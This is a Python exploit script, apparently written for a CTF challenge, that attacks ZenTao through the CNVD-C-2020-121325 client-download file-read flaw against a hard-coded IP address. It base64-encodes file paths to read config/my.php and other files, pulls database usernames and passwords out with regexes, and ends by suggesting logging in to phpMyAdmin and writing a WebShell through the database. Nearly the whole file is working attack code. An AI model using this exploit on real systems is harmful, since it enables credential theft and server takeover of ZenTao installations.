#!/usr/bin/env python3
"""
禅道 CNVD-C-2020-121325 - 信息泄露利用
思路：绕过 allow_url_fopen 和 open_basedir 限制，
尝试读取 Web 目录下的 config/my.php 获取数据库凭证。
"""

import requests
import base64
import time
import re

def solve_config_read():
    base_url = "http://47.113.178.182:32829"
    session = requests.Session()

    print("""
╔═══════════════════════════════════════════════════════════════╗
║      禅道 配置文件读取 (Database Config Dump)                ║
╚═══════════════════════════════════════════════════════════════╝
    """)

    # 建立会话
    print("[*] 建立 Session...")
    try:
        session.get(f"{base_url}/zentao/", timeout=5)
        print("    ✓ 完成\n")
    except:
        pass

    # 目标文件列表 (相对路径，绕过 open_basedir)
    # config/my.php 是禅道存放数据库密码的地方
    targets = [
        ("config/my.php", "主配置文件"),
        ("../config/my.php", "上级目录配置"),
        ("config/config.php", "备用配置文件"),
        ("index.php", "测试：index.php"),
        ("db/my.php", "旧版配置路径"),
        ("www/index.php", "www目录"),
        ("module/index.php", "module目录"),
    ]

    success_count = 0

    for target, description in targets:
        print("=" * 70)
        print(f"目标: {description}")
        print(f"路径: {target}")
        print("=" * 70)

        # 1. 构造 Payload (Link 参数)
        # 使用 URL-Safe Base64 编码目标路径
        b64_target = base64.b64encode(target.encode()).decode()
        link_param = b64_target.replace('+', '-').replace('/', '_')

        print(f"[*] Base64: {b64_target}")
        print(f"[*] Safe:   {link_param}")

        # 保存为 .txt 方便查看
        save_name = f"dump_{abs(hash(target)) % 10000}.txt"

        params = {
            "m": "client",
            "f": "download",
            "link": link_param,
            "fileName": save_name
        }

        try:
            # 发送请求
            print(f"\n[*] 发送下载请求...")
            resp = session.get(f"{base_url}/zentao/index.php", params=params, timeout=10)
            print(f"    响应: {resp.status_code}")

            time.sleep(1)

            # 读取结果
            file_url = f"{base_url}/zentao/data/client/1/{save_name}"
            print(f"\n[*] 访问: {file_url}")
            res = session.get(file_url, timeout=5)

            file_size = len(res.content)
            print(f"    状态: {res.status_code}")
            print(f"    大小: {file_size} bytes")

            if file_size > 0:
                success_count += 1
                print(f"\n    🎉 成功获取文件!")
                print("    " + "=" * 66)
                content = res.text

                # 显示完整内容（如果不是太长）
                if len(content) < 2000:
                    print(content)
                else:
                    print(content[:1000])
                    print(f"\n    ... (省略 {len(content)-1000} 字符) ...")

                print("    " + "=" * 66)

                # 尝试提取数据库密码
                if "db" in content.lower() and ("password" in content.lower() or "user" in content.lower()):
                    print("\n    ✓ 发现数据库配置信息！")
                    print("    " + "-" * 66)

                    # 多种模式匹配
                    patterns = [
                        (r'db->user\s*=\s*[\'"]([^\'"]+)[\'"]', "User"),
                        (r'db->password\s*=\s*[\'"]([^\'"]+)[\'"]', "Password"),
                        (r'db->name\s*=\s*[\'"]([^\'"]+)[\'"]', "Database"),
                        (r'db->host\s*=\s*[\'"]([^\'"]+)[\'"]', "Host"),
                        (r'\$config->db->user\s*=\s*[\'"]([^\'"]+)[\'"]', "User"),
                        (r'\$config->db->password\s*=\s*[\'"]([^\'"]+)[\'"]', "Password"),
                        (r'\$config->db->name\s*=\s*[\'"]([^\'"]+)[\'"]', "Database"),
                    ]

                    for pattern, name in patterns:
                        match = re.search(pattern, content)
                        if match:
                            print(f"    {name}: {match.group(1)}")

                    print("    " + "-" * 66)

                # 检查是否包含 flag
                if "flag{" in content.lower() or "ctf{" in content.lower():
                    print("\n    🚩🚩🚩 在文件中发现 Flag!")
                    return content

                print(f"\n    ✓ 成功读取 {target}")

                # 如果成功读取了重要文件，可能需要继续尝试其他文件
                if "config" in target or success_count >= 2:
                    print(f"\n[*] 已成功读取 {success_count} 个文件，继续尝试...")

            else:
                print("    ✗ 文件为空 (0 bytes)")

        except Exception as e:
            print(f"    ✗ 错误: {e}")

        print()

    print("\n" + "=" * 70)
    print(f"扫描完成")
    print("=" * 70)
    print(f"成功读取: {success_count} 个文件")

    if success_count == 0:
        print("\n[-] 所有文件都无法读取")
        print("[*] 可能原因:")
        print("    1. allow_url_fopen 和 allow_url_include 都被禁用")
        print("    2. file_get_contents 被完全禁用")
        print("    3. 需要特殊的认证或触发条件")
    else:
        print("\n[+] 文件读取功能正常，但未找到 Flag")
        print("[*] 下一步:")
        print("    1. 使用数据库凭证登录 Adminer/phpMyAdmin")
        print("    2. 在数据库中搜索 Flag")
        print("    3. 尝试利用数据库写入 WebShell")

    return None


if __name__ == "__main__":
    result = solve_config_read()

    if result:
        print("\n" + "=" * 70)
        print("找到 Flag!")
        print("=" * 70)
        print(result)
        print("=" * 70)
